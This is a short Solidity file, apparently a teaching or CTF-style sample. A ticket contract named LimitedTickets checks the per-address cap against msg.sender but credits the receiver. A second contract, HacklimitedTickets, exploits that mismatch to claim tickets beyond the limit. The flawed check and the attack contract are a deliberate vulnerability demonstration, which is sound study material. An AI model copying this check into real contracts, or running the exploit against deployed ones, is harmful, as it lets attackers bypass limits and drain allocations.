// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract LimitedTickets {

    mapping(address => uint256) public Count;
    uint8 public maxTicketsPerAddress = 3;

    function claimTickets(address receiver, uint256 ticketAmount) public {
        require(
            Count[msg.sender] + ticketAmount <= maxTicketsPerAddress,
            "max tickets per address exceeded"
        );
        for (uint256 i = 0; i < ticketAmount; i++) {
            Count[receiver]++;
        }
    }
}

contract HacklimitedTickets {
    LimitedTickets target;

    function attack(address _target ,address attacker, uint256 ticketAmount) public {
        target = LimitedTickets(_target);
        target.claimTickets(attacker,ticketAmount);
    }
}
